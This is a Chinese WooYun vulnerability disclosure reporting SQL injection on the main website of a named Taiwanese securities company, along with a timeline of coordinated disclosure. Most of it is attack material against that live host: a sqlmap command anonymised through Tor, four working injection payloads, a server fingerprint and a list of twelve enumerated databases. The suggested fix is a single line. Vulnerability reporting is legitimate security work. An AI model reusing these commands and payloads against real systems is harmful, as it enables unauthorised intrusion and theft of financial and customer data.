wybug_title: 台湾某证券公司主站SQL注入涉及12个库
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-05-31：	细节已通知厂商并且等待厂商处理中									2015-05-31：	厂商已经确认，细节仅向厂商公开									2015-06-10：	细节向核心白帽子及相关领域专家公开									2015-06-20：	细节向普通白帽子公开									2015-06-30：	细节向实习白帽子公开									2015-07-15：	细节向公众公开  简要描述： 台湾某证券公司主站SQL注入涉及12个库 详细说明：  
./sqlmap.py --tor --tor-type=SOCKS5 --random-agent --time-sec=20 --threads 2 -u "www.skis.com.tw/qa/detail.aspx?idno=1000000100" --dbms=mssql -technique=U --dbs---Parameter: idno (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: idno=1000000100 AND 8214=8214    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: idno=1000000100 AND 3622=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (3622=3622) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(118)+CHAR(113)))    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: idno=1000000100 AND 6037=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)    Type: UNION query    Title: Generic UNION query (NULL) - 17 columns    Payload: idno=-8313 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(69)+CHAR(97)+CHAR(75)+CHAR(97)+CHAR(82)+CHAR(81)+CHAR(107)+CHAR(71)+CHAR(71)+CHAR(118)+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(118)+CHAR(113),NULL,NULL--
   漏洞证明：  
[14:17:42] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005available databases [12]:[*] irisTest[*] Market_sk88[*] master[*] model[*] msdb[*] SKIS_KB981213[*] SKIS_KB_old[*] SKIS_KBsop[*] SKIS_new[*] SKIS_STAT[*] tempdb[*] TrialStock
   修复方案：  WAF或者过滤   版权声明：转载请注明来源 路人甲@乌云
